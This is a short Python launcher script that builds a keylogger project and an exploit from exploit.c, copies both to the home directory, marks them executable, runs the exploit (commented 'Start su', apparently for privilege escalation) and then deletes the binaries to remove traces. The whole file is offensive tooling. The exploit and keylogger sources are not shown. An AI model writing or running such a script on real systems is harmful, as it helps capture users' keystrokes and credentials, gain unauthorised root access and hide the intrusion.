import os

def r(command):
	os.system(command)

def main():
	# Compilation
	r("make -C simple-key-logger/")
	r("gcc exploit.c")
	
	# Move compiled files to home
	r("cp a.out ~")
	r("cp simple-key-logger/skeylogger ~")
	
	# Give exec permissions to both files
	r("chmod +x ~/a.out")
	r("chmod +x ~/skeylogger")

	# Start su
	r("cd ~ && ./a.out")
	
	# Clean
	r("rm ~/a.out ~/skeylogger")

if __name__ == "__main__":
	main()
